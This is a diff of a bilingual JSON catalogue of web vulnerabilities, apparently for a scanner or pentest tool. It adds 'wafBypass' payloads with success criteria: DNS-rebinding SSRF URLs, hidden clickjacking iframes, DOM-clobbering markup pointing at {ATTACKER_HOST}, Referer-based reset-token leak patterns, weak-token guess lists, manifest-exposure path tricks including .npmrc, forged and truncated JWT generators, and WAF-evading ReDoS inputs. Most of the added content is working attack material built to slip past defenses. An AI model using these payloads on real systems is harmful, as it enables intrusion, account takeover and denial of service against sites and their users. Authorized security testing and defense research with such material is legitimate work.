+            "en": "Distinguish internal services by port under one wildcard hostname past hostname blacklists; distinguishable port responses confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "AAAA 独立通道",
+            "en": "AAAA-Only Channel"
+          },
+          "command": "http://rebind6.{LAB_OAST}/  # 仅 AAAA 记录: 第一次 ::ffff 外部, 第二次 内部 v6",
+          "description": {
+            "zh": "绕过只审计 A 记录解析的规则：用 AAAA 记录做 IPv6 侧重绑定；两次请求源地址变化即成功。",
+            "en": "Perform v6-side rebinding via AAAA-only records against A-record auditing; source addresses changing across requests confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "CNAME 级联间接解析",
+            "en": "CNAME Cascade Indirection"
+          },
+          "command": "http://hop1.{LAB_OAST}/  # CNAME -> 192.168.1.1.sslip.io -> 192.168.1.1",
+          "description": {
+            "zh": "绕过对最终内网 IP 的直接特征匹配：经 CNAME 链条间接到达内网目标；网关页面返回即成功。",
+            "en": "Reach the internal target through a CNAME cascade against direct-IP matching; a gateway page returning confirms success."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-iframe",
@@ -1802,8 +2393,8 @@
         "en": "Clickjacking"
       },
       "subCategory": {
-        "zh": "UI Redressing",
-        "en": "UI Redressing"
+        "zh": "透明覆盖点击劫持",
+        "en": "Transparent Overlay Clickjacking"
       },
       "tutorial": {
         "overview": {
@@ -1870,7 +2461,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "混合模式隐形",
+            "en": "Blend-Mode Invisibility"
+          },
+          "command": "<iframe src=\"https://{TARGET}\" style=\"opacity:1;mix-blend-mode:multiply;background:#fff;position:fixed;inset:0;z-index:999\"></iframe>",
+          "description": {
+            "zh": "绕过 opacity<1 阈值检测：不透明度保持 1 借混合模式在白底隐形；覆盖层点击穿透目标即成功。",
+            "en": "Keep opacity at 1 and vanish via blend mode on a white background past low-opacity thresholds; overlay clicks reaching the target confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "离屏定位回滑",
+            "en": "Offscreen Positioning Snap-Back"
+          },
+          "command": "<iframe src=\"https://{TARGET}\" style=\"position:fixed;left:-9999px;top:0;width:100%;height:100%\"></iframe><script>document.body.onpointermove=function(){document.querySelector('iframe').style.left='0'}</script>",
+          "description": {
+            "zh": "绕过全屏覆盖特征：初始离屏在指针移动时回滑到位；回滑后交互命中目标控件即成功。",
+            "en": "Park offscreen and slide back on pointer movement past full-screen-overlay signatures; post-slide interactions hitting target controls confirm success."
+          }
+        },
+        {
+          "title": {
+            "zh": "content-visibility 切换",
+            "en": "content-visibility Toggle"
+          },
+          "command": "<iframe src=\"https://{TARGET}\" style=\"content-visibility:hidden;contain-intrinsic-size:100% 100vh;position:fixed;inset:0\"></iframe><script>setTimeout(function(){document.querySelector('iframe').style.contentVisibility='visible'},4000)</script>",
+          "description": {
+            "zh": "以渲染跳过属性替代透明度隐藏：定时恢复可见后承载点击；恢复期内点击命中目标即成功。",
+            "en": "Hide via render-skipping instead of transparency and restore on a timer; clicks during the restored window hitting the target confirm success."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-x-frame-options",
@@ -2135,8 +2761,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "命名属性覆盖",
-        "en": "Named-Property Clobbering"
+        "zh": "DOM Clobbering",
+        "en": "DOM Clobbering"
       },
       "tutorial": {
         "overview": {
@@ -2203,7 +2829,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "form/input 组合覆盖",
+            "en": "form/input clobbering"
+          },
+          "command": "<form id=x><input name=y value=alert></form>",
+          "description": {
+            "zh": "绕过 a 标签过滤：表单组合生成 x.y。判据：x.y 求值为 input 元素。",
+            "en": "form/input builds x.y when a tags are filtered. Success: x.y is an input."
+          }
+        },
+        {
+          "title": {
+            "zh": "重复 name 集合覆盖",
+            "en": "Duplicate-name collection"
+          },
+          "command": "<img name=x><img name=y>",
+          "description": {
+            "zh": "两个 name 生成 window.x 集合。判据：window.x 为集合且含 y。",
+            "en": "Two names produce a collection. Success: window.x contains y."
+          }
+        },
+        {
+          "title": {
+            "zh": "单标签双属性覆盖",
+            "en": "Single-tag dual attributes"
+          },
+          "command": "<a id=x name=y>",
+          "description": {
+            "zh": "单标签同时暴露 id 与 name。判据：x.y 可达。",
+            "en": "One anchor exposing both. Success: x.y reachable."
+          }
+        },
+        {
+          "title": {
+            "zh": "iframe 双属性覆盖",
+            "en": "iframe dual attributes"
+          },
+          "command": "<iframe name=x id=y></iframe>",
+          "description": {
+            "zh": "iframe 的 name 直接覆盖 window.x。判据：window.x 指向 frame。",
+            "en": "iframe name clobbers the global directly. Success: window.x is the frame."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-document",
@@ -2244,8 +2916,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "document 命名属性污染",
-        "en": "document Named-Property Pollution"
+        "zh": "DOM Clobbering",
+        "en": "DOM Clobbering"
       },
       "tutorial": {
         "overview": {
@@ -2312,7 +2984,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "location 属性覆盖",
+            "en": "location clobbering"
+          },
+          "command": "<a id=location href=\"javascript:alert(1)\">",
+          "description": {
+            "zh": "覆盖 document.location 引用干扰跳转逻辑。判据：脚本读取 document.location 得到元素。",
+            "en": "Clobbers document.location. Success: document.location resolves to the anchor."
+          }
+        },
+        {
+          "title": {
+            "zh": "form 深层覆盖",
+            "en": "form deep clobbering"
+          },
+          "command": "<form id=cookie><input name=href value=\"//{ATTACKER_HOST}\"></form>",
+          "description": {
+            "zh": "构造 cookie.href 引用劫持。判据：读取 document.cookie.href 得到攻击域。",
+            "en": "Builds cookie.href chain. Success: document.cookie.href returns the attacker URL."
+          }
+        },
+        {
+          "title": {
+            "zh": "img name 覆盖",
+            "en": "img name clobbering"
+          },
+          "command": "<img name=domain src=x>",
+          "description": {
+            "zh": "name 属性生成 document.domain 引用。判据：document.domain 返回元素。",
+            "en": "img name generates document.domain. Success: it resolves to the element."
+          }
+        },
+        {
+          "title": {
+            "zh": "write 属性覆盖",
+            "en": "write clobbering"
+          },
+          "command": "<a id=write data-x=1></a><a id=write href=\"javascript:alert(1)\">",
+          "description": {
+            "zh": "覆盖 document.write 干扰净化流程。判据：document.write 不再是函数。",
+            "en": "Clobbers document.write to break sanitizers. Success: it is no longer a function."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-window",
@@ -2353,8 +3071,8 @@
         "en": "XSS Cross-Site Scripting"
       },
       "subCategory": {
-        "zh": "window 命名属性污染",
-        "en": "window Named-Property Pollution"
+        "zh": "DOM Clobbering",
+        "en": "DOM Clobbering"
       },
       "tutorial": {
         "overview": {
@@ -2421,7 +3139,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "top 属性覆盖",
+            "en": "top clobbering"
+          },
+          "command": "<a id=top href=\"javascript:alert(1)\">",
+          "description": {
+            "zh": "覆盖 window.top 欺骗框架检测。判据：window.top 为元素且跳转逻辑失效。",
+            "en": "Clobbers window.top to defeat frame checks. Success: window.top is the anchor."
+          }
+        },
+        {
+          "title": {
+            "zh": "parent 属性覆盖",
+            "en": "parent clobbering"
+          },
+          "command": "<a id=parent href=//{ATTACKER_HOST}>",
+          "description": {
+            "zh": "覆盖 window.parent。判据：parent 求值为锚点。",
+            "en": "Clobbers window.parent. Success: parent resolves to the anchor."
+          }
+        },
+        {
+          "title": {
+            "zh": "iframe self 覆盖",
+            "en": "iframe self clobbering"
+          },
+          "command": "<iframe name=self src=//{ATTACKER_HOST}></iframe>",
+          "description": {
+            "zh": "iframe 的 name 覆盖 self。判据：window.self 指向 frame。",
+            "en": "iframe name clobbers self. Success: window.self is the frame."
+          }
+        },
+        {
+          "title": {
+            "zh": "globalThis 覆盖",
+            "en": "globalThis clobbering"
+          },
+          "command": "<a id=globalThis href=\"javascript:alert(1)\">",
+          "description": {
+            "zh": "覆盖 globalThis 引用干扰严格查找。判据：globalThis 为元素。",
+            "en": "Clobbers globalThis. Success: it resolves to the anchor."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-api",
@@ -2574,8 +3338,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "重置令牌传输泄露",
-        "en": "Reset Token Transport Leakage"
+        "zh": "密码重置与恢复劫持",
+        "en": "Password Reset & Recovery Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -2642,7 +3406,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "路径变体泄露",
+            "en": "Path-Variant Leakage"
+          },
+          "command": "Referer: https://{ATTACKER_HOST}/reset-password\nReferer: https://{ATTACKER_HOST}/password-reset\nReferer: https://{ATTACKER_HOST}/forgot",
+          "description": {
+            "zh": "重置流程不同路径名的外链均携带令牌泄露。成功判据：任一路径收到含 token 的 Referer。",
+            "en": "Outbound links from differently-named reset flow paths all leak the token. Success: any path receives a token-bearing Referer."
+          }
+        },
+        {
+          "title": {
+            "zh": "端口变体泄露",
+            "en": "Port-Variant Leakage"
+          },
+          "command": "Referer: https://{ATTACKER_HOST}:8443/reset\nReferer: http://{ATTACKER_HOST}:8080/reset\nReferer: https://{ATTACKER_HOST}:3000/",
+          "description": {
+            "zh": "非常规端口绕过基于标准端口的泄露监控。成功判据：监控未报警且令牌到达。",
+            "en": "Non-standard ports bypass port-based leak monitoring. Success: no alert and the token arrives."
+          }
+        },
+        {
+          "title": {
+            "zh": "协议变形泄露",
+            "en": "Scheme-Variant Leakage"
+          },
+          "command": "Referer: http://{ATTACKER_HOST}/reset\nReferer: https://{ATTACKER_HOST}/reset",
+          "description": {
+            "zh": "协议切换组合降级重定向场景检验泄露面。成功判据：降级请求仍携带令牌。",
+            "en": "Scheme switching combined with downgrade redirects tests the leak surface. Success: downgraded requests still carry the token."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-token-ext",
@@ -2683,8 +3482,8 @@
         "en": "Authentication Vulnerabilities"
       },
       "subCategory": {
-        "zh": "重置令牌可预测性",
-        "en": "Reset Token Predictability"
+        "zh": "密码重置与恢复劫持",
+        "en": "Password Reset & Recovery Hijacking"
       },
       "tutorial": {
         "overview": {
@@ -2751,7 +3550,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "弱词年份组合",
+            "en": "Weak Words + Year"
+          },
+          "command": "token=admin2024\ntoken=reset2024\ntoken=password2024\ntoken=admin24\ntoken=welcome2024",
+          "description": {
+            "zh": "弱词加年份的常见弱令牌形态批量验证。成功判据：任一值通过重置校验。",
+            "en": "Weak words combined with years as common weak-token forms. Success: any value passes reset validation."
+          }
+        },
+        {
+          "title": {
+            "zh": "手机号形态令牌",
+            "en": "Phone-Like Token Forms"
+          },
+          "command": "token=13800000000\ntoken=13800138000\ntoken=10000000000\ntoken=19999999999",
+          "description": {
+            "zh": "以手机号为种子的弱令牌探测。成功判据：任一形态被接受。",
+            "en": "Phone-number-seeded weak token probing. Success: any form is accepted."
+          }
+        },
+        {
+          "title": {
+            "zh": "重复数字令牌",
+            "en": "Repeated-Digit Tokens"
+          },
+          "command": "token=000000\ntoken=111111\ntoken=222222\ntoken=888888\ntoken=999999",
+          "description": {
+            "zh": "重复数字形态绕过纯长度校验。成功判据：任一重复数字值通过。",
+            "en": "Repeated-digit forms bypass length-only validation. Success: any repeated-digit value passes."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-npm-package-json",
@@ -2792,8 +3626,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "NPM 项目清单暴露",
-        "en": "NPM Project Manifest Exposure"
+        "zh": "源码与依赖清单泄露",
+        "en": "Source & Dependency Disclosure"
       },
       "tutorial": {
         "overview": {
@@ -2864,6 +3698,41 @@
       "tags": [
         "bizlogic",
         "npm_package_json"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "空字节后缀",
+            "en": "Null-byte suffix"
+          },
+          "command": "/package.json%00",
+          "description": {
+            "zh": "截断绕过精确匹配。判据：返回 JSON。",
+            "en": "Trailing null. Success: JSON returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "双斜杠变体",
+            "en": "Double-slash variant"
+          },
+          "command": "//package-lock.json",
+          "description": {
+            "zh": "规范化差异。判据：200。",
+            "en": "Normalization differential. Success: 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "查询干扰",
+            "en": "Query interference"
+          },
+          "command": "/.npmrc?x=1",
+          "description": {
+            "zh": "查询串改变指纹。判据：返回 npmrc 内容。",
+            "en": "Query string alters fingerprint. Success: npmrc returned."
+          }
+        }
       ]
     },
     {
@@ -2905,8 +3774,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Python 项目清单暴露",
-        "en": "Python Project Manifest Exposure"
+        "zh": "源码与依赖清单泄露",
+        "en": "Source & Dependency Disclosure"
       },
       "tutorial": {
         "overview": {
@@ -2977,6 +3846,41 @@
       "tags": [
         "bizlogic",
         "python_requirements"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "空字节后缀",
+            "en": "Null-byte suffix"
+          },
+          "command": "/requirements.txt%00",
+          "description": {
+            "zh": "截断绕过。判据：返回依赖清单。",
+            "en": "Trailing null. Success: manifest returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "双斜杠变体",
+            "en": "Double-slash variant"
+          },
+          "command": "//pyproject.toml",
+          "description": {
+            "zh": "规范化差异。判据：200。",
+            "en": "Normalization differential. Success: 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写变体",
+            "en": "Case variant"
+          },
+          "command": "/pipfile",
+          "description": {
+            "zh": "大小写不敏感服务器。判据：返回 Pipfile。",
+            "en": "Case-insensitive server. Success: Pipfile returned."
+          }
+        }
       ]
     },
     {
@@ -3018,8 +3922,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Composer 文件暴露",
-        "en": "Composer File Exposure"
+        "zh": "源码与依赖清单泄露",
+        "en": "Source & Dependency Disclosure"
       },
       "tutorial": {
         "overview": {
@@ -3090,6 +3994,41 @@
       "tags": [
         "bizlogic",
         "php_composer_json"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "空字节后缀",
+            "en": "Null-byte suffix"
+          },
+          "command": "/composer.json%00",
+          "description": {
+            "zh": "截断绕过精确规则。判据：返回 JSON。",
+            "en": "Trailing null. Success: JSON returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "双斜杠变体",
+            "en": "Double-slash variant"
+          },
+          "command": "//composer.lock",
+          "description": {
+            "zh": "规范化差异。判据：200。",
+            "en": "Normalization differential. Success: 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "深层 vendor 路径",
+            "en": "Deep vendor path"
+          },
+          "command": "/vendor/autoload.php",
+          "description": {
+            "zh": "直接探测自动加载器。判据：返回 PHP 文件。",
+            "en": "Probes the autoloader. Success: PHP file returned."
+          }
+        }
       ]
     },
     {
@@ -3131,8 +4070,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Bundler 清单暴露",
-        "en": "Bundler Manifest Exposure"
+        "zh": "源码与依赖清单泄露",
+        "en": "Source & Dependency Disclosure"
       },
       "tutorial": {
         "overview": {
@@ -3199,7 +4138,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "空字节后缀",
+            "en": "Null-byte suffix"
+          },
+          "command": "/Gemfile%00",
+          "description": {
+            "zh": "截断绕过。判据：返回 Gemfile。",
+            "en": "Trailing null. Success: Gemfile returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "双斜杠变体",
+            "en": "Double-slash variant"
+          },
+          "command": "//Gemfile.lock",
+          "description": {
+            "zh": "规范化差异。判据：200。",
+            "en": "Normalization differential. Success: 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "通配 gemspec",
+            "en": "Wildcard gemspec"
+          },
+          "command": "/*.gemspec",
+          "description": {
+            "zh": "通配枚举 gemspec。判据：返回任一文件。",
+            "en": "Wildcard probe. Success: any file returned."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-java-pom-xml",
@@ -3240,8 +4214,8 @@
         "en": "File Vulnerabilities"
       },
       "subCategory": {
-        "zh": "Java 构建清单暴露",
-        "en": "Java Build Manifest Exposure"
+        "zh": "源码与依赖清单泄露",
+        "en": "Source & Dependency Disclosure"
       },
       "tutorial": {
         "overview": {
@@ -3308,7 +4282,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "空字节后缀",
+            "en": "Null-byte suffix"
+          },
+          "command": "/pom.xml%00",
+          "description": {
+            "zh": "截断绕过。判据：返回 pom。",
+            "en": "Trailing null. Success: pom returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "双斜杠变体",
+            "en": "Double-slash variant"
+          },
+          "command": "//build.gradle",
+          "description": {
+            "zh": "规范化差异。判据：200。",
+            "en": "Normalization differential. Success: 200."
+          }
+        },
+        {
+          "title": {
+            "zh": "Maven 深层路径",
+            "en": "Deep Maven path"
+          },
+          "command": "/WEB-INF/classes/META-INF/maven/pom.xml",
+          "description": {
+            "zh": "部署内嵌 pom。判据：返回构建信息。",
+            "en": "Embedded pom inside WEB-INF. Success: build info returned."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-padding",
@@ -3461,8 +4470,8 @@
         "en": "JWT Security"
       },
       "subCategory": {
-        "zh": "JWT 签名完整性",
-        "en": "JWT Signature Integrity"
+        "zh": "算法混淆与签名绕过",
+        "en": "Algorithm Confusion & Signature Bypass"
       },
       "tutorial": {
         "overview": {
@@ -3529,7 +4538,42 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "头部变形：签名截断变体",
+            "en": "Header Mutation: Signature Truncation"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();tok=e({'alg':'HS256','typ':'JWT'})+'.'+e({'sub':'1'});sig='SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';print(tok+'.'+sig[:21])\"",
+          "description": {
+            "zh": "签名截断一半，测试实现只校验前 N 字节或长度宽容的场景；成功判据：截断签名令牌仍通过验证。",
+            "en": "Truncates the signature to test prefix-check or length-lenient implementations. Success: the truncated-signature token still validates."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：非法 base64 签名变体",
+            "en": "Header Mutation: Invalid base64 Signature"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'HS256','typ':'JWT'})+'.'+e({'sub':'1'})+'.!!!!')\"",
+          "description": {
+            "zh": "签名段填非法字符 !!!!，探测异常处理路径是否回退为通过（fail-open）；成功判据：非法签名未导致拒绝。",
+            "en": "Fills the signature with invalid characters to probe whether error handling fails open. Success: the invalid signature does not cause rejection."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部变形：算法错配组合变体",
+            "en": "Header Mutation: Algorithm Mismatch Combo"
+          },
+          "command": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'ES256','typ':'JWT'})+'.'+e({'sub':'1'})+'.'+base64.urlsafe_b64encode(b'A'*64).rstrip(b'=').decode())\"",
+          "description": {
+            "zh": "头部声明 ES256 而签名填充 64 字节，验证是否只按头部声明做长度校验；成功判据：伪签名通过椭圆曲线校验路径。",
+            "en": "Claims ES256 in the header with 64 filler signature bytes to test header-only length validation. Success: the fake signature passes the EC verification path."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-redos",
@@ -3638,7 +4682,53 @@
           "preserved-original-command",
           "added-authoritative-reference"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "十六进制/码点构造填充",
+            "en": "Hex/codepoint filler construction"
+          },
+          "command": "node -e \"const t0=Date.now(); /(x+)+$/.test('\\x78'.repeat(30)+'!'); console.log('hex-x', Date.now()-t0, 'ms');\"\nnode -e \"const t0=Date.now(); /(x+)+$/.test(String.fromCharCode(120).repeat(30)+'X'); console.log('c2c-x', Date.now()-t0, 'ms');\"\nnode -e \"const t0=Date.now(); /(x+)+$/.test('\\u0078'.repeat(30)+'1'); console.log('uni-x', Date.now()-t0, 'ms');\"",
+          "description": {
+            "zh": "绕过对字面 xxxx 长串的 WAF 签名：\\x78、\\u0078 与 fromCharCode(120) 在运行期拼出等价 x 串，报文只含转义标记；成功判据：三种构造的回溯耗时与字面输入一致且随长度陡增。",
+            "en": "Bypasses WAF signatures on literal xxxx runs: \\x78, \\u0078 and fromCharCode(120) assemble the equivalent x-run at runtime so only escape tokens cross the wire; success criterion: all three constructions time like the literal input and climb steeply with length."
+          }
+        },
+        {
+          "title": {
+            "zh": "等价量词形态集测",
+            "en": "Equivalent quantifier-shape battery"
+          },
+          "command": "node -e \"const s='x'.repeat(30)+'!'; for (const p of ['(x+)+$','(x|x+)+$','(x*)*$','(x+)*y','(^x)*$']) { const t=Date.now(); new RegExp(p).test(s); console.log(p, Date.now()-t, 'ms'); }\"",
+          "description": {
+            "zh": "绕过只识别 (x+)+ 单一写法的防护：(x|x+)+、(x*)*、(x+)*y、(^x)* 等回溯等价形态轮换验证同一输入；成功判据：多个形态计时显著（>100ms）且随输入长度非线性增长。",
+            "en": "Bypasses defenses keyed on the single (x+)+ shape: (x|x+)+, (x*)*, (x+)*y and (^x)* are backtrack-equivalent alternates probed with the same input; success criterion: several shapes time significantly (>100 ms) and grow non-linearly with input length."
+          }
+        },
+        {
+          "title": {
+            "zh": "交替字符填充变体",
+            "en": "Alternating-char filler variants"
+          },
+          "command": "xyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy!\nxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyZ\nxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy1\nxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy@",
+          "description": {
+            "zh": "绕过对单字符长串（纯 aaaa/xxxx）的长度与熵检测：交替 xy 串对 (x|y)+、(xy)+、(x|y?)+ 类模式同样是灾难输入，签名完全不同；成功判据：交替串触发与纯 x 串同级的回溯耗时。",
+            "en": "Bypasses length/entropy checks on single-char runs: alternating xy strings are equally catastrophic for (x|y)+, (xy)+ and (x|y?)+ style patterns while bearing a totally different signature; success criterion: the alternating run triggers the same magnitude of backtracking as the pure x-run."
+          }
+        },
+        {
+          "title": {
+            "zh": "表单/JSON 包裹与编码边界",
+            "en": "Form/JSON wrappers and encoded boundaries"
+          },
+          "command": "q=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!\ndata=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&type=regex\n{\"input\":\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!\"}\nq=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%21\nq=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%2521",
+          "description": {
+            "zh": "绕过对顶层超长值的拦截：把 x 串放入具名表单字段、JSON 键值或 XML 文本中并在边界用 %21/%2521 编码，应用解码后进入正则；成功判据：包裹形态均产生可测的回溯延迟（对比空串基线）。",
+            "en": "Bypasses interception of top-level oversized values: the x-run is placed inside named form fields, JSON members or XML text with %21/%2521-encoded boundaries, decoded by the app before the regex; success criterion: wrapped forms all produce measurable backtracking delay versus the empty-string baseline."
+          }
+        }
+      ]
     },
     {
       "id": "bizlogic-jwt-top100",
